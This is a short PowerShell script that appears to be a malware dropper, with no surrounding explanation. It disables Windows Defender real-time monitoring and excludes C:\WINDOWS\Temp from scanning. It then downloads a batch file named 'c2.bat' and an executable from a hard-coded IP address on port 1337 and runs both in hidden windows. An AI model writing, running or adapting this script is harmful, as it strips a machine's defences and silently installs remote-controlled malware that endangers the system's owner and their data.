Set-MpPreference -DisableRealtimeMonitoring $true
Start-Sleep -s 2
Add-MpPreference -ExclusionPath "C:\WINDOWS\Temp\"
Invoke-WebRequest "http://37.187.176.161:1337/c2.bat" -OutFile "C:\WINDOWS\Temp\c2.bat"
Invoke-Webrequest "http://37.187.176.161:1337/ange.exe" -OutFile "C:\WINDOWS\Temp\lol.exe"
Start-Process "cmd.exe"  "/c C:\WINDOWS\Temp\c2.bat" -windowstyle Hidden
Start-Process "cmd.exe"  "/c C:\WINDOWS\Temp\lol.exe" -windowstyle Hidden
